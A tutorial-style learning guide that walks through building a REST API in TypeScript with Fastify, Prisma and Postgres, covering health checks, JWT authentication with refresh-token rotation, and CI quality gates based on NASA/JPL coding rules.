# Learning Guide: Building a Production REST API

This file grows with the project. Each chapter explains one step: **what** was built,
**why** it was designed that way, the **concepts** behind it, and **exercises** so you
can rebuild it yourself without looking.

| Chapter | Step                                                                | Status |
| ------- | ------------------------------------------------------------------- | ------ |
| 1       | Project skeleton, Postgres, health checks, tests, Docker, CI        | ✅     |
| 2       | Authentication: register, login, refresh tokens, logout             | ✅     |
| 3       | Professional quality: CI/CD, security scanning, NASA/JPL code rules | ✅     |
| 4       | Workspaces, members and role-based permissions                      | ⏳     |
| 5       | Projects and tasks: pagination, filtering, sorting                  | ⏳     |
| 6       | Error format, logging, OpenAPI docs                                 | ⏳     |
| 7       | Seed data and a recruiter-ready README                              | ⏳     |

---

## Chapter 1: The skeleton

### What we built

A tiny API that does almost nothing yet, but is wired the way real production services are:

```
GET /health/live   -> 200 {"status":"ok"}
GET /health/ready  -> 200 {"status":"ok","database":"up"}   (or 503 if the DB is down)
```

Plus everything around it: typed config, a database connection, structured logs,
automated tests, a Docker image and a CI pipeline that runs on every pull request.

It may feel strange to spend a whole step on an app with two endpoints. That's the point:
in a real job, the skeleton is where most "production" quality comes from. Every later
feature inherits it for free.

### The folder layout

```
src/
  config/env.ts        # reads and validates settings
  plugins/prisma.ts    # database connection, shared with the whole app
  routes/health.ts     # the two health endpoints
  app.ts               # buildApp(): assembles plugins and routes
  server.ts            # starts listening, handles shutdown
  generated/prisma/    # code Prisma writes for us (not committed)
prisma/schema.prisma   # database tables (none yet)
test/health.test.ts    # automated tests
Dockerfile, docker-compose.yml, .github/workflows/ci.yml
```

**Why split it like this?** Each file has one job. When something breaks you know where to
look, and when you add a feature you add files instead of growing one giant file.

### Concept 1: Why Fastify (and not Express)?

Express is the classic choice, and you'll see it everywhere. Fastify does the same job but:

- **Schemas built in.** You describe a route's input and output, and Fastify validates
  requests and serializes responses from that description. Faster and safer.
- **Plugins with scope.** Features are packaged as plugins with clear boundaries
  (see Concept 4).
- **Async-first.** Route handlers just `return` a value or `throw` an error.
- **Built-in structured logging** with pino.

Knowing both is good. Fastify shows you understand the "why" behind modern backends.

### Concept 2: Validate configuration at startup ("fail fast")

`src/config/env.ts` uses **Zod** to describe every environment variable the app needs:

```ts
const EnvSchema = z.object({
  PORT: z.coerce.number().int().positive().default(3000),
  DATABASE_URL: z.url({ protocol: /^postgres(ql)?$/ }),
  ...
});
```

If `DATABASE_URL` is missing, the app refuses to start and prints exactly what's wrong.
Without this, the app would start "fine" and crash on the first request that touches the
database, maybe hours later, maybe only in production.

Bonus: `z.infer<typeof EnvSchema>` gives us a TypeScript type for free, so
`env.PORT` is known to be a `number` everywhere.

> **Rule of thumb:** anything coming from outside your code (env vars, HTTP requests,
> files) is untrusted until validated.

### Concept 3: Prisma and connection pools

**Prisma** is an ORM: you describe tables in `prisma/schema.prisma`, and it generates a
fully typed client (`prisma.user.findMany(...)`) so the TypeScript compiler catches typos
in column names.

Opening a database connection is slow (network handshake, authentication). So we create
**one** `PrismaClient` for the whole app; under the hood it keeps a **pool** of open
connections and reuses them across requests. Creating a client per request is a classic
beginner bug that exhausts the database's connection limit under load.

Prisma 7 talks to Postgres through a **driver adapter** (`@prisma/adapter-pg`, built on the
standard `pg` driver), which is why you see `new PrismaClient({ adapter })`.

### Concept 4: Fastify plugins and decorators

`src/plugins/prisma.ts` is a plugin. It:

1. creates the client,
2. `app.decorate('prisma', prisma)` attaches it so any route can use `app.prisma`,
3. `app.addHook('onClose', ...)` disconnects when the app shuts down.

By default Fastify plugins are **encapsulated**: what they add is only visible inside them.
Wrapping with `fastify-plugin` (`fp`) "breaks" encapsulation on purpose so the whole app
sees `app.prisma`. The `declare module 'fastify'` block tells TypeScript that the property
exists.

### Concept 5: Liveness vs readiness

Two different questions:

- **Liveness** (`/health/live`): "Is the process alive?" If this fails, restart it.
  It must never check the DB, otherwise a database blip would restart every API instance.
- **Readiness** (`/health/ready`): "Can it serve traffic right now?" It runs `SELECT 1`.
  If this fails, the load balancer stops sending traffic here until it recovers, and
  returns **503 Service Unavailable**.

Kubernetes, AWS ECS and Docker all use this pattern.

### Concept 6: Structured logs and request IDs

Fastify logs JSON lines, not free text:

```json
{
  "level": 30,
  "reqId": "6566…",
  "req": { "method": "GET", "url": "/health/ready" },
  "msg": "incoming request"
}
```

Machines (Grafana Loki, Datadog, CloudWatch) can search and filter JSON. Every request gets
a UUID (`genReqId`), and we send it back in an `x-request-id` header. When a user reports a
bug, they give you that id, and you find every log line for that exact request.

In development we pipe logs through `pino-pretty` so they're readable for humans.

### Concept 7: Separate "build" from "listen" (testability)

`app.ts` exports `buildApp()`, which assembles the app but **doesn't** open a port.
`server.ts` is the only file that calls `listen()`.

This lets tests do:

```ts
const app = await buildApp(loadEnv());
const res = await app.inject({ method: 'GET', url: '/health/live' });
expect(res.statusCode).toBe(200);
```

`app.inject()` simulates an HTTP request in memory: no port, no network, very fast, and
it goes through the exact same routing, validation and hooks as a real request.

### Concept 8: A real database in tests

Tests run against a **real Postgres** (`api_test`), not a mock. Mocks can lie: a query
that works against a mock can fail on real Postgres. A separate test database means
tests can freely create and delete data without touching your dev data.
`vitest.config.ts` loads `.env.test` to point tests at it.

### Concept 9: Graceful shutdown

When you deploy a new version, the platform sends the old process `SIGTERM`. We catch it
and call `app.close()`, which stops accepting new connections, lets in-flight requests
finish, runs `onClose` hooks (closing the DB pool), and then exits. Without this, users
get random errors during every deploy.

### Concept 10: Multi-stage Docker builds

The `Dockerfile` has two stages:

1. **build**: installs everything (TypeScript, Prisma CLI), compiles to `dist/`.
2. **runtime**: copies only `dist/` and production dependencies.

The final image is smaller (faster deploys) and has fewer tools an attacker could use.
It also runs as the unprivileged `node` user, never as root.

### Concept 11: Continuous Integration

`.github/workflows/ci.yml` runs on every push and pull request:

1. starts a throwaway Postgres as a **service container**,
2. `npm ci` (clean, reproducible install from `package-lock.json`),
3. type-check, test, build,
4. builds the Docker image to prove it still builds.

A green check on every PR is one of the first things a reviewer (or recruiter browsing
your GitHub) looks at.

### Build it yourself

Try recreating this chapter from an empty folder, peeking only when stuck:

1. `npm init -y`, set `"type": "module"`, install `fastify zod` and dev deps `typescript tsx vitest @types/node`.
2. Write `env.ts` with a Zod schema for `PORT` only. Make the app crash with a nice message when `PORT=abc`.
3. Write `buildApp()` with a single `GET /health/live` route, and `server.ts` that listens.
4. Write one Vitest test using `app.inject()`.
5. Add Prisma: `npm i @prisma/client @prisma/adapter-pg pg`, `npm i -D prisma`, create `schema.prisma`, run `npx prisma generate`.
6. Add the Prisma plugin and the `/health/ready` route.
7. Add the `x-request-id` header and a test for it.
8. Write the Dockerfile and the CI workflow.

### Exercises

1. **Break it on purpose.** Stop Postgres and call `/health/ready`. What status and log
   line do you get? Does `/health/live` still return 200? Why does that matter?
2. **Add a version endpoint.** `GET /version` returning `{ "version": "1.0.0" }` read
   from `package.json`, with a response schema and a test.
3. **Config challenge.** Add a `CORS_ORIGIN` env var that must be a URL in production but
   is optional in development. (Hint: Zod's `.superRefine` or `.refine`.)
4. **Think about it.** Why does the readiness check use `SELECT 1` instead of querying a
   real table?

### Words to know

REST · endpoint · status code (200, 404, 503) · environment variable · ORM ·
connection pool · plugin · decorator · liveness/readiness probe · structured logging ·
request id · integration test · graceful shutdown · SIGTERM · multi-stage build · CI

---

## Chapter 2: Authentication

### What we built

```
POST /auth/register  {email, password, name}  -> 201 {user, accessToken, refreshToken}
POST /auth/login     {email, password}        -> 200 {user, accessToken, refreshToken}
POST /auth/refresh   {refreshToken}           -> 200 {accessToken, refreshToken}   (new pair)
POST /auth/logout    {refreshToken}           -> 204
GET  /users/me       Authorization: Bearer …  -> 200 {id, email, name, createdAt}
```

Plus: a `users` and `refresh_tokens` table (our first migration), one consistent error
format, input validation with Zod, rate limiting on login, and 18 new tests.

### New files

```
prisma/migrations/…_auth/migration.sql  # the SQL Prisma generated for our tables
src/lib/errors.ts                       # AppError: status + stable code + message
src/plugins/error-handler.ts            # turns every error into the same JSON shape
src/plugins/auth.ts                     # JWT setup + app.authenticate guard
src/modules/auth/auth.schemas.ts        # Zod schemas for requests and responses
src/modules/auth/auth.service.ts        # the business logic (hashing, tokens, rotation)
src/modules/auth/auth.routes.ts         # thin HTTP layer that calls the service
src/modules/users/users.routes.ts       # GET /users/me
test/global-setup.ts, test/helpers.ts   # migrate test DB, reset tables, shared helpers
test/auth.test.ts                       # 18 tests
```

**Why "modules"?** As the API grows, grouping by feature (`auth/`, `users/`, later
`workspaces/`, `tasks/`) scales better than grouping by type (`all-routes/`,
`all-services/`). Everything about auth lives in one folder.

**Why routes + service?** Routes deal with HTTP (status codes, headers). The service deals
with rules (how to hash, when a token is valid). Keeping them apart means you could call
`AuthService` from a CLI script or a background job without faking HTTP.

### Concept 1: Migrations

You never edit a production database by hand. Instead:

1. change `prisma/schema.prisma` (we added `User` and `RefreshToken`),
2. run `npm run db:migrate -- --name auth`,
3. Prisma compares the schema with the DB and writes a SQL file in `prisma/migrations/`.

That SQL file is committed. Every environment (your laptop, CI, production) runs the
same files in the same order (`prisma migrate deploy`), so they all end up identical.
Open `migration.sql` and read it: it's plain SQL, and you should always review it.

Notice `@map("password_hash")` and `@@map("users")`: TypeScript uses `camelCase`, SQL
conventionally uses `snake_case` table and column names. Mapping gives you both.

### Concept 2: Never store passwords, store slow hashes

A hash is a one-way function: easy to compute from the password, practically impossible
to reverse. At login we hash what the user typed and compare.

But regular hashes (SHA-256) are _fast_, and a GPU can try billions per second against a
leaked database. **argon2id** is designed to be slow and use lots of memory, which kills
that attack. It also adds a random **salt** per user, so two people with the same password
get different hashes. The salt is stored inside the hash string (`$argon2id$v=19$m=…`).

Also notice the password has a **max** length (128). It's a sanity bound, like the maximum on
every other string (chapter 3, rule 3), but it isn't what protects the CPU: argon2 first
condenses the password with a fast hash, then does its slow work on that fixed-size result, so
a 10 KB password costs about the same as an 8-character one. Every hash still costs real CPU,
which is why the authentication endpoints are rate limited (Concept 9).

### Concept 3: Don't leak which emails exist

Login returns the exact same `401 INVALID_CREDENTIALS` for "no such email" and "wrong
password". If the messages differed, attackers could build a list of real accounts.

Subtler: if unknown emails returned instantly but real ones took 100 ms (argon2 is slow),
the _timing_ would leak the same thing. So for unknown emails we still run
`argon2.verify` against a dummy hash. Look for `dummyHash` in `auth.service.ts`.

One endpoint still tells: registering an email that already exists answers
`409 EMAIL_TAKEN`. Most sign-up forms accept that trade-off. Avoiding it needs email
verification: always answer "check your inbox", then email either a welcome link or "you
already have an account". Meanwhile, the rate limit makes testing emails one by one slow.

### Concept 4: Access tokens (JWT)

After login the client gets an **access token**, a JWT, and sends it on every request:
`Authorization: Bearer eyJhbGci…`.

A JWT is three base64 parts: `header.payload.signature`. The payload is just
`{"sub":"<user id>","iat":…,"exp":…}`. **It is readable by anyone** (paste one into
jwt.io), so never put secrets in it. What makes it trustworthy is the **signature**:
an HMAC of header + payload using `JWT_ACCESS_SECRET`. Change one character of the payload
and the signature no longer matches (the "rejects a tampered token" test proves it).

Why JWTs? The server can verify them with no database lookup, which is fast and scales.
The downside: you can't "cancel" one before it expires. So we keep them **short-lived
(15 minutes)**.

We also pin the algorithm (`algorithms: ['HS256']`). Some old JWT libraries trusted the
`alg` field in the token itself, letting attackers pick `none`. Pinning prevents that.

### Concept 5: Refresh tokens and rotation

15-minute logins would be annoying, so login also returns a **refresh token**: a long
random string (32 bytes) valid for 30 days, used only to get new access tokens.

- It's **random, not a JWT**, and stored in the DB, so we _can_ revoke it.
- We store only its **SHA-256 hash**. If the database leaks, the tokens can't be used.
  (Fast SHA-256 is fine here, unlike passwords: the token is 256 random bits, there's
  nothing to guess.)
- **Rotation:** each `/auth/refresh` revokes the old refresh token and issues a new one.
- **Reuse detection:** all tokens from one login share a `familyId`. If a _revoked_ token
  is presented again, either the user or a thief is using a stale copy. We can't tell
  which, so we revoke the whole family and both must log in again. This is the approach
  recommended by the OAuth 2.0 security best practices.
- **Race safety:** we revoke with `updateMany({ where: { id, revokedAt: null } })` and check
  that it changed 1 row. If two requests refresh the same token at the same instant, only
  one wins.

> **Where should clients keep tokens?** For browser apps, an `HttpOnly`, `Secure`,
> `SameSite` cookie is safest for the refresh token because JavaScript can't read it.
> We return tokens in JSON because it keeps this API usable from mobile apps, scripts and
> tests. Moving the refresh token to a cookie is Exercise 4.

### Concept 6: Validation with Zod + type providers

`fastify-type-provider-zod` lets routes use Zod schemas directly:

```ts
app.post('/register', { schema: { body: RegisterBody, response: { 201: AuthResponse } } }, …)
```

That one line gives us three things:

1. **Validation:** bad input is rejected with 400 before our handler runs.
2. **Types:** `request.body` is automatically typed as `{ email: string; … }`.
3. **Safe output:** the response is serialized through `AuthResponse`, so fields not in
   the schema (like `passwordHash`) are dropped. Defense in depth: even if we accidentally
   return the whole DB row, the hash never leaves the server.

Schemas can also _transform_: `Email` trims and lowercases, so `" Alice@X.com "` and
`"alice@x.com"` are the same account.

### Concept 7: One error format

Every error now looks like:

```json
{
  "error": {
    "code": "VALIDATION_ERROR",
    "message": "Request validation failed",
    "details": [{ "path": "/email", "message": "Invalid email address" }]
  }
}
```

- `code` is stable and machine-readable. Frontends switch on it.
- `message` is for humans and can change.
- Unknown errors become a generic 500. The full error goes to the logs, never to the client
  (stack traces and SQL help attackers).

We also tell the logger to **redact** the `Authorization` header so tokens never end up in
log files.

### Concept 8: Uniqueness belongs to the database

To reject duplicate emails we _don't_ do "check if exists, then insert". Two signups at the
same moment could both pass the check. Instead the DB has a `UNIQUE` index on `email`, we
just insert, and turn Prisma's `P2002` error into `409 EMAIL_TAKEN`. Let the database
enforce invariants; it's the only component that sees every write.

### Concept 9: Rate limiting

`@fastify/rate-limit` allows `AUTH_RATE_LIMIT_MAX` (default 10) login/register/refresh
attempts per IP per minute, then returns `429 RATE_LIMITED`. That turns "try a million
passwords" into "try 10 a minute". It's off globally (`global: false`) and enabled per
route via `config.rateLimit`.

### Concept 10: Testing auth properly

Tests now run against migrated tables, and `resetDb()` truncates them before each test so
tests can't affect each other. `fileParallelism: false` stops two test files from fighting
over the same database.

Look at _what_ we test: not just the happy path, but the attacks. Tampered token, expired
token, reused refresh token, duplicate email in different case, timing-safe error messages,
brute force. Security code is mostly about the unhappy paths.

### Build it yourself

1. Add the `User` model, run a migration, read the generated SQL.
2. Write `POST /auth/register` that hashes with argon2 and returns the user (no tokens yet).
   Write a test proving the hash isn't the password.
3. Add `@fastify/jwt`, return an access token, and add `GET /users/me` guarded by
   `app.authenticate`. Test with and without the token.
4. Add `POST /auth/login` with the dummy-hash trick.
5. Add the `RefreshToken` model, then `/auth/refresh` with rotation. Write the reuse test
   _first_, watch it fail, then implement family revocation.
6. Add the error handler and rate limiting.

### Exercises

1. **Read a JWT.** Register with curl, copy the `accessToken`, and decode the middle part:
   `echo '<payload>' | base64 -d`. What fields do you see? Why is it fine that it's readable?
2. **Change password.** Add `POST /users/me/password` taking `currentPassword` and
   `newPassword`. It should verify the current one, update the hash, and revoke **all** the
   user's refresh tokens. Write tests.
3. **Logout everywhere.** Add `POST /auth/logout-all` (authenticated) that revokes every
   refresh token for the user.
4. **Cookies.** Make `/auth/login` also set the refresh token as an
   `HttpOnly; Secure; SameSite=Strict` cookie using `@fastify/cookie`, and let
   `/auth/refresh` read it from there.
5. **Think about it.** Why do we hash refresh tokens with SHA-256 but passwords with
   argon2? What would go wrong if we swapped them?

### Words to know

migration · hash · salt · argon2id · JWT · signature · HMAC · claims (`sub`, `exp`) ·
access token · refresh token · token rotation · reuse detection · user enumeration ·
timing attack · rate limiting · 401 vs 403 vs 409 vs 429 · idempotent · defense in depth

---

## Chapter 3: Professional quality: CI/CD, security scanning and NASA/JPL code rules

### What we built

No new endpoints this time. Instead, the project got the machinery real teams use to keep a
codebase healthy as it grows, and every new rule was applied to the code from chapters 1
and 2:

- **Coding rules from NASA's Jet Propulsion Laboratory**, the "Power of Ten", adapted to
  TypeScript and enforced automatically, including an ESLint rule we wrote ourselves.
- **The strictest TypeScript settings**, **Prettier** for formatting, and **Git hooks** that
  check your work before it leaves your machine.
- **A CI pipeline** that runs on every pull request: formatting, lint, types, tests with a
  coverage threshold, commit messages, a dependency audit, a Docker build with a smoke test
  and a vulnerability scan, CodeQL code scanning and dependency review.
- **Automated maintenance and releases (CD):** Dependabot opens update pull requests every
  week, and pushing a version tag publishes Docker images and a GitHub release.
- **The documents every serious repository has:** README badges, CONTRIBUTING, SECURITY,
  CODE_OF_CONDUCT, CHANGELOG, issue and pull request templates, CODEOWNERS.

The new rules, and a review of the code with them in mind, found real problems in the code we
had already written. Fixing them was part of this step:

| Problem found                                                                               | Fix                                                                       |
| ------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------- |
| A crash between "create the user" and "create their first session" left a user half-created | Both writes happen in one transaction                                     |
| A crash between "revoke the old refresh token" and "issue the new one" logged the user out  | Rotation is one transaction, and an `invariant()` checks its result       |
| A request could take forever, and a busy DB pool made requests wait forever                 | Request, connection and statement timeouts, all in `src/config/limits.ts` |
| Request bodies could be 1 MB (Fastify's default) though our largest is under 1 KB           | A 64 KB body limit                                                        |
| `Email` trimmed and lowercased the raw string before checking its length                    | `z.string().max(320)` bounds it before any processing                     |
| The shutdown handler could hang forever, and an error in it was never handled               | `shutdown()` handles its own errors, and exits anyway after 10 seconds    |
| A module-level `let` held the dummy password hash                                           | It's a private field of `AuthService`                                     |
| Checks like `if (!user \|\| !ok)` relied on "truthiness"                                    | Explicit comparisons: `if (user === null \|\| !passwordMatches)`          |
| A logout that arrived while a refresh was rotating the token missed the new token           | Rotation and revocation lock the user's row first: they run one at a time |
| Prisma's own transaction limits (2 s to start, 5 s in total) applied without anyone knowing | Declared in `src/config/limits.ts` and passed to Prisma                   |

The test suite grew from 24 to 60 tests. Line coverage is about 98%, and CI fails if it drops
below the thresholds in `vitest.config.ts`.

### New files

```
.github/
  workflows/ci.yml             # every PR: format, lint, types, tests, commits, audit, Docker
  workflows/pr-title.yml       # the PR title follows Conventional Commits (rechecked on edit)
  workflows/codeql.yml         # security static analysis of the code and the workflows
  workflows/dependency-review.yml  # blocks vulnerable dependencies and unexpected licenses
  workflows/scorecard.yml      # OpenSSF Scorecard: grades our security practices weekly
  workflows/release.yml        # tag v1.2.3 -> images on GHCR + GitHub release
  dependabot.yml               # weekly update PRs for npm, actions and the Docker image
  CODEOWNERS, pull_request_template.md, ISSUE_TEMPLATE/
.husky/                        # Git hooks: pre-commit, commit-msg, pre-push
eslint.config.js               # lint rules, labeled by Power of Ten rule
eslint-rules/no-recursion.js   # our own lint rule (Power of Ten rule 1)
.prettierrc.json, .editorconfig, .gitattributes, .nvmrc
commitlint.config.js           # Conventional Commits
tsconfig.build.json            # compiles only src/ for production
scripts/changelog-section.mjs  # release notes from CHANGELOG.md
scripts/coverage-summary.mjs   # coverage table on the CI run page
src/config/limits.ts           # every resource limit, in one place (rule 3)
src/lib/invariant.ts           # assertions (rule 5)
src/lib/locks.ts               # row locks, so some transactions run one at a time
src/lib/db.ts, src/lib/tokens.ts
test/input-bounds.test.ts      # proves every input string and array has a maximum size
test/no-recursion-rule.test.ts # tests for our lint rule
test/errors.test.ts, test/invariant.test.ts, test/scripts.test.ts
CONTRIBUTING.md, SECURITY.md, CODE_OF_CONDUCT.md, CHANGELOG.md
```

### Concept 1: Quality gates, and catching problems early

A **quality gate** is an automatic check that must pass before code moves forward. We have
four layers, from fastest to slowest:

| Layer       | When it runs        | What it checks                                           | Time    |
| ----------- | ------------------- | -------------------------------------------------------- | ------- |
| Your editor | As you type         | Types and lint errors, underlined in red                 | Instant |
| Git hooks   | `commit` and `push` | Lint and format the changed files, commit message, types | Seconds |
| CI          | Every pull request  | Everything, from a clean machine, including security     | Minutes |
| Code review | Before merging      | Design, naming, logic: what machines can't judge         | Hours   |

A bug costs more the later it's found: a red underline costs nothing, a failed CI run a few
minutes, a bug in production an incident. That's why teams "shift left": move every check
as early as possible. And anything a machine can check, a machine should check, so human
reviewers can spend their attention on the design.

### Concept 2: Formatter, linter, type checker: three different jobs

- **Prettier** decides how code _looks_: quotes, commas, line breaks. It has almost no
  options on purpose, so there's nothing to argue about in reviews.
- **ESLint** finds code that is legal but risky: a promise nobody awaits, a variable that
  shadows another, a function too complex to read. With **typescript-eslint** in
  `strictTypeChecked` mode, rules can use type information: for example, it knows that
  `app.close()` returns a promise, so forgetting `await` is an error.
- **The TypeScript compiler** proves that types line up. `strict: true` is only the start.
  `tsconfig.json` switches on every extra check:

| Option                                 | What it catches                                                                                     |
| -------------------------------------- | --------------------------------------------------------------------------------------------------- |
| `noUncheckedIndexedAccess`             | `rows[0]` has type `Row \| undefined`: the array might be empty, so you must check                  |
| `exactOptionalPropertyTypes`           | `{ name?: string }` means "absent or a string", and `name: undefined` is not allowed                |
| `noPropertyAccessFromIndexSignature`   | `process.env.PORT` must be written `process.env['PORT']`: a reminder that it may be missing         |
| `noImplicitReturns`                    | A function that returns a value on some paths but falls off the end on another                      |
| `noUnusedLocals`, `noUnusedParameters` | Dead code, often a sign of a bug                                                                    |
| `verbatimModuleSyntax`                 | `import type` for types, so the compiled JavaScript never imports something that doesn't exist      |
| `allowJs` + `checkJs`                  | The JavaScript files (configs, scripts, our lint rule) are type-checked too, through JSDoc comments |

### Concept 3: NASA/JPL's "Power of Ten" rules

In 2006, Gerard Holzmann of NASA's Jet Propulsion Laboratory (JPL) published
["The Power of Ten: Rules for Developing Safety-Critical Code"](https://spinroot.com/gerard/pdf/P10.pdf).
JPL writes the software that flies spacecraft, where a crash can't be fixed by restarting a
server. Holzmann's insight was that long coding standards get ignored, so he picked just ten
rules, each one checkable by a tool. JPL later built them into its institutional coding
standard, used on missions like the Curiosity Mars rover.

The rules were written for C. A web API isn't a spacecraft, but it wants the same things:
code simple enough to analyze, resources that can't run out, and failures that are loud and
safe instead of silent. So we kept each rule's _intent_ and translated it:

| #   | Original rule (for C)                                               | Our TypeScript version                                                                        | Enforced by                                               |
| --- | ------------------------------------------------------------------- | --------------------------------------------------------------------------------------------- | --------------------------------------------------------- |
| 1   | Simple control flow: no `goto`, no recursion                        | No recursion, no labels; complexity at most 10, nesting at most 3 levels                      | Our `no-recursion` rule, `complexity`, `max-depth`        |
| 2   | Every loop has a fixed upper bound                                  | No `while`, `do...while`, `for...in` or `for await`; `for` loops over finite arrays           | `no-restricted-syntax`                                    |
| 3   | No dynamic memory allocation after initialization                   | Every resource has a fixed limit: body size, string lengths, pool size, timeouts              | `limits.ts`, Zod schemas, `input-bounds.test.ts`          |
| 4   | Functions fit on one printed page (about 60 lines)                  | At most 60 lines per function and 400 per file                                                | `max-lines-per-function`, `max-lines`                     |
| 5   | At least two assertions per function, on average                    | Validate all input at the boundary; assert internal invariants with `invariant()`             | Zod, `src/lib/invariant.ts`, code review                  |
| 6   | Declare data at the smallest possible scope                         | `const` by default, no module-level mutable state, no shadowing                               | `prefer-const`, `no-shadow`, `no-restricted-syntax`       |
| 7   | Check every return value and every parameter                        | No forgotten promises, no truthiness checks on non-booleans, exhaustive `switch`              | `no-floating-promises`, `strict-boolean-expressions`      |
| 8   | Limit the preprocessor to simple macros                             | No `eval`, `any`, `as unknown as T`, `!` or `@ts-ignore`; every `eslint-disable` explains why | typescript-eslint, `eslint-comments`                      |
| 9   | Restrict pointers: one level of dereferencing, no function pointers | No reassigning parameters, at most 4 parameters, at most 3 nested callbacks                   | `no-param-reassign`, `max-params`, `max-nested-callbacks` |
| 10  | All warnings on from day one, zero warnings, daily static analysis  | Strictest compiler settings, every lint rule is an error, CodeQL on every PR and weekly       | `tsconfig.json`, `--max-warnings 0`, CodeQL               |

Open `eslint.config.js`: every rule is labeled with the Power of Ten rule it enforces. Some
rules don't need a lint rule (3 and 5): they are enforced by code, tests and review.

#### Rule 1: why ban recursion, and how we wrote our own lint rule

With recursion, how deep the call stack goes depends on the _input_. A recursive function
that walks a JSON document works fine in tests, then crashes with "Maximum call stack size
exceeded" when an attacker sends a document nested 100,000 levels deep. A loop with a limit
can't do that.

ESLint has no rule against recursion, so we wrote one: `eslint-rules/no-recursion.js`. ESLint
parses each file into an **AST** (abstract syntax tree: the code as a tree of nodes like
`FunctionDeclaration` and `CallExpression`) and calls our rule's handlers as it walks the
tree. Our rule keeps a stack of the functions it is currently inside. When it sees a call, it
checks whether the called name is one of those functions:

```js
FunctionDeclaration: enter,          // push { name: 'walk' } on the stack
'FunctionDeclaration:exit': exit,    // pop it
CallExpression(node) {
  const called = describeCall(node); // walk(...) or this.walk(...)
  if (stack.some((frame) => frame.name === called.name && frame.isMember === called.isMember)) {
    context.report({ node, messageId: 'recursion', data: { name: called.name } });
  }
},
```

`test/no-recursion-rule.test.ts` tests it with ESLint's `RuleTester`: code that must pass and
code that must be reported. Its limitation is written in the file: it can't see _indirect_
recursion (`a` calls `b`, `b` calls `a`). That needs a call graph of the whole program (see
the exercises).

What do you write instead? An explicit stack and a hard limit. `test/input-bounds.test.ts`
walks a JSON Schema tree this way:

```ts
const stack = [{ node: root, path: '' }];
for (let i = 0; i < MAX_NODES; i++) {
  const current = stack.pop();
  if (current === undefined) return problems; // walked everything
  // ...check current.node, push its children...
}
throw new Error(`schema has more than ${String(MAX_NODES)} nodes`);
```

The loop has a fixed upper bound (rule 2), and if the limit is ever reached, it fails loudly
instead of running forever.

#### Rule 2: loops with a fixed upper bound

`while (condition)` runs until something changes, and nothing in the syntax proves that it
will. So `while`, `do...while` and `for await...of` (which can wait forever on a stream) are
banned, and so is `for...in`, which also visits inherited properties. What's left: `for`
loops with a counter and a limit, and `for...of` or `.map()` over arrays. Arrays are finite,
and rule 3 keeps them small.

The rule even reaches the CI scripts: the Docker smoke test waits for the API with
`for attempt in $(seq 1 30)`, not with "until it answers".

#### Rule 3: bounded resources

C programs on spacecraft allocate all their memory at startup, so they can never run out
mid-flight. A Node.js server can't do that, but it can make sure that **no input is unbounded
and nothing waits without a limit**. All the limits live in `src/config/limits.ts`:

| Limit                     | Value | Default without it                                           |
| ------------------------- | ----- | ------------------------------------------------------------ |
| Request body              | 64 KB | 1 MB                                                         |
| Time to receive a request | 30 s  | No limit: a slow client could hold a connection open forever |
| Database connections      | 10    | 10, now explicit and configurable with `DATABASE_POOL_MAX`   |
| Wait for a DB connection  | 5 s   | Wait forever when the pool is busy                           |
| One SQL statement         | 10 s  | No limit: one slow query could hold a connection forever     |
| Start a transaction       | 5 s   | 2 s, Prisma's default: easy to miss                          |
| One whole transaction     | 10 s  | 5 s, Prisma's default: easy to miss                          |
| Graceful shutdown         | 10 s  | Wait forever for open requests                               |

And every string a client can send has a maximum length, every array a maximum size. A
reviewer could miss a missing `.max()`, so a test checks it for us: `test/input-bounds.test.ts`
converts every input schema to JSON Schema and fails if any string or array is unbounded.
When you add an endpoint, the test checks its schemas automatically.

What still grows is **history**. Every login and every refresh stores a refresh token row, and
nothing deletes the old ones yet. Requests stay fast (every lookup uses an index and every
list is capped), but a table that only grows needs housekeeping. A production deployment runs
a scheduled job that deletes tokens that expired a while ago, a fixed number of rows at a time
(rule 2 again). Writing it is one of the exercises below.

#### Rule 5: assertions

There are two kinds of "this should never happen":

1. **Bad input from outside.** That's expected, and handled at the boundary: Zod rejects it
   with a `400` before our code runs.
2. **A bug in our own code.** That's what assertions are for. `invariant(condition, message)`
   throws if the condition is false:

```ts
const live = await tx.refreshToken.count({ where: { familyId, revokedAt: null } });
invariant(live === 1, `session must have exactly 1 live refresh token, found ${String(live)}`);
```

Because this runs inside the transaction, a failed invariant rolls back the whole refresh,
so the bug can't leave bad data in the database. The client gets a generic 500 and the log
gets the full message. The signature `asserts condition` also tells TypeScript that after the
call, the condition is true, just like an `if` would.

#### Rule 7: check every return value

The most common bug in async JavaScript is a forgotten `await`: the promise runs on its own,
its error is never caught, and the next line runs too early. `no-floating-promises` makes
every promise either awaited, returned, or explicitly discarded with `void`, which shows the
reader it's deliberate.

`strict-boolean-expressions` bans "truthiness" checks on anything that isn't a boolean. Why?
`if (count)` is false for `0`, and `if (name)` is false for `""`. Both are classic bugs. You
write what you mean: `if (user === null)`, `if (count > 0)`.

#### Rule 10: zero warnings

A warning nobody acts on is noise, and noise hides the warning that matters. So every rule in
`eslint.config.js` is an error, CI runs ESLint with `--max-warnings 0`, and an
`eslint-disable` comment that no longer disables anything is itself an error. If a rule must
be broken, you disable it for one line and explain why:

```ts
// eslint-disable-next-line <rule-name> -- <why this is safe here>
```

Tests follow the same safety rules, with the size rules relaxed: a `describe()` block is
naturally longer than 60 lines.

### Concept 4: Tests and coverage

**Coverage** measures which lines and branches of `src/` ran during the tests. We're at about
98% of lines, and `vitest.config.ts` makes CI fail below 90% of lines and 85% of branches.

Coverage tells you what is _not_ tested, but a high number doesn't prove much: a test that
calls a function without checking the result raises coverage and catches nothing. So the new
tests check behavior: a 500 hides the internal error message, a 100 KB body gets `413`,
malformed JSON gets `400`, two simultaneous refreshes with the same token give exactly one
`200` and one `401` and revoke the session. 100% is not the goal: the last few percent are
usually code that's hard to reach, and chasing them produces tests that check nothing.

**Race tests need extra care.** Two requests started together with `Promise.all` only overlap
if both can reach the database at the same moment. With a single open connection, the second
request waits while a new connection is set up, so the two run one after the other, and the
test passes even without the protection it's supposed to check. Our first race tests had
exactly that flaw: a review removed the fixes and the tests still passed. `warmUpPool()` in
`test/helpers.ts` now opens a few connections first, and every race test was checked both
ways: it passes with the fix and fails without it.

That review also found a real race. A logout that arrived while a refresh was rotating the
token revoked the old token but missed the new one, which didn't exist yet when the logout's
`UPDATE` started, so the session lived on. Now both start with `lockUser()` from
`src/lib/locks.ts` (`SELECT ... FOR UPDATE` on the user's row), so the second one waits for
the first and then sees its result. A test fires the logout at different moments of a refresh
and checks that no live token is left.

### Concept 5: Git hooks and Conventional Commits

